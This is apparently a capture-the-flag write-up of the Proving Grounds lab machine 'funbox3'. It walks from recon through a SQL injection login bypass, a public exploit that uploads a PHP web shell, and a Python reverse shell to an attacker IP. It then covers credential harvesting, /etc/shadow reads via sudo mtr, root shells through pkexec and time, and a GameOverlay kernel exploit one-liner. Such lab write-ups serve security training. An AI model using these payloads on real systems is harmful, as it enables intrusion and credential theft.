A Boc from Proving Grounds

## Recon
```
└─# nmap -sV -Pn -p1-65535 --min-rate 3000 $ip
Host is up (1.7s latency).
Not shown: 54101 filtered tcp ports (no-response), 11432 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
80/tcp open  tcpwrapped


```
found an apache default config 2.4.41
```
└─# ffuf -u "http://$ip/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -e .php
admin                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 680ms]
dashboard.php           [Status: 302, Size: 10272, Words: 2141, Lines: 216, Duration: 682ms]
forgot-password.php     [Status: 200, Size: 2763, Words: 402, Lines: 64, Duration: 786ms]
header.php              [Status: 200, Size: 1666, Words: 376, Lines: 42, Duration: 899ms]
index.php               [Status: 200, Size: 3468, Words: 634, Lines: 80, Duration: 983ms]
index.php               [Status: 200, Size: 3468, Words: 634, Lines: 80, Duration: 813ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 934ms]
logout.php              [Status: 200, Size: 75, Words: 2, Lines: 4, Duration: 843ms]
profile.php             [Status: 302, Size: 7247, Words: 1393, Lines: 150, Duration: 802ms]
registration.php        [Status: 200, Size: 9409, Words: 2490, Lines: 260, Duration: 708ms]
robots.txt              [Status: 200, Size: 14, Words: 2, Lines: 2, Duration: 1237ms]
secret                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 956ms]
store                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 726ms]
:: Progress: [9238/9238] :: Job [1/1] :: 29 req/sec :: Duration: [0:03:43] :: Errors: 4 ::

```

on /admin i found `Sign in to CRM Admin`
also found a secret
```
„Anyone who lives within their means suffers from a lack of imagination.“
Oscar Wilde (*1854 - †1900)

```
a store
```
Welcome to online CSE bookstore
└─# searchsploit CSE Bookstore
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
CSE Bookstore 1.0 - 'quantity' Persistent Cross-site Scripting    | php/webapps/48973.txt
CSE Bookstore 1.0 - Authentication Bypass                         | php/webapps/48960.txt
CSE Bookstore 1.0 - Multiple SQL Injection                        | php/webapps/49314.txt
------------------------------------------------------------------ ---------------------------------
```
and a registration
i register and logged in
## Exploitation
i will now exploit the CSE Bookstore
SQLI
```
Payload:
Name: admin
Pass: %' or '1'='1
```

RCE 
found this : https://www.exploit-db.com/exploits/47887
```
└─# python3 cse_rce.py 
usage: cse_rce.py [-h] url
cse_rce.py: error: the following arguments are required: url
                                                                                                    
┌──(root㉿xXxX)-[/home/blo/CTFs/Boot2root/PG]
└─# python3 cse_rce.py http://192.168.206.111/store/
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://192.168.206.111/store/bootstrap/img/IStcIzPORD.php
> Example command usage: http://192.168.206.111/store/bootstrap/img/IStcIzPORD.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): n
                                                  

```

Shell
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.173",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
└─# sudo rlwrap nc -lnvp 1337  
listening on [any] 1337 ...
connect to [192.168.45.173] from (UNKNOWN) [192.168.206.111] 44346
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@funbox3:/var/www/html/store/bootstrap/img$ ls

```

## Lateral
on store database
```
www-data@funbox3:/var/www/html/store/database$ ls
ls
readme.txt.txt  www_project.sql

INSERT INTO `admin` (`name`, `pass`) VALUES
('admin', 'd033e22ae348aeb5660fc2140aec35850c4da997');

www-data@funbox3:/home$ ls
ls
tony
www-data@funbox3:/home$ cd tony
cd tony
www-data@funbox3:/home/tony$ ls
ls
password.txt
www-data@funbox3:/home/tony$ cat password.txt
cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
www-data@funbox3:/home/tony$ 

```

connect to tony using ssh
```
tony@funbox3:~$ find / -type f -name local.txt 2>/dev/null | xargs cat
dca528a433bfb4363d4fd53a57ab54e6

/var/www/local.txt

```

## Vertical
```
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
tony@funbox3:~$ 
```
**Pkexec**
```
tony@funbox3:/tmp$ sudo pkexec /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```
**mtr**
Read files
```
FILE=/etc/shadow
tony@funbox3:/tmp$ sudo mtr --raw -F "$FILE"
mtr: Failed to resolve host: root:$6$vhQCRnZ7cB8CmPHi$FGwOfBLodnjYboCNgkE.e5fN7J3qEdXahyKIrSR1lt3eeVIdHBfUvl8Dow4/CYLAAk.7YKVDOqKSG2pLLnHUq/:18565:0:99999:7:::: Name or service not known
mtr: Failed to resolve host: daemon:*:18375:0:99999:7:::: Name or service not known
mtr: Failed to resolve host: bin:*:18375:0:99999:7:::: Name or service not known
mtr: Failed to resolve host: sys:*:18375:0:99999:7:::: Name or service not known
mtr: Failed to resolve host: sync:*:18375:0:99999:7:::: Name or service not known
mtr: Failed to resolve host: games:*:18375:0:99999:7:::: Name or service not known

tony@funbox3:/tmp$ FILE=/root/proof.txt
tony@funbox3:/tmp$ sudo mtr --raw -F "$FILE"
mtr: Failed to resolve host: 2771545b544c9550f50fc340ce9dede5: Temporary failure in name resolution
tony@funbox3:/tmp$ 

```

**Time**
```
tony@funbox3:/tmp$ sudo time /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# 

```

## GameOverlay
```
tony@funbox3:~$ uname -a
Linux funbox3 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

root@funbox3:/tmp# unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
root@funbox3:/tmp# id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
root@funbox3:/tmp# hostnamectl
   Static hostname: funbox3
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 92ec3c988921478186aee5c70411b62c
           Boot ID: e0fd77ba96de4fc5b257458eb2c91186
    Virtualization: vmware
  Operating System: Ubuntu 20.04 LTS
            Kernel: Linux 5.4.0-42-generic
      Architecture: x86-64
root@funbox3:/root# cat proof.txt 
2771545b544c9550f50fc340ce9dede5
root@funbox3:/root# 

```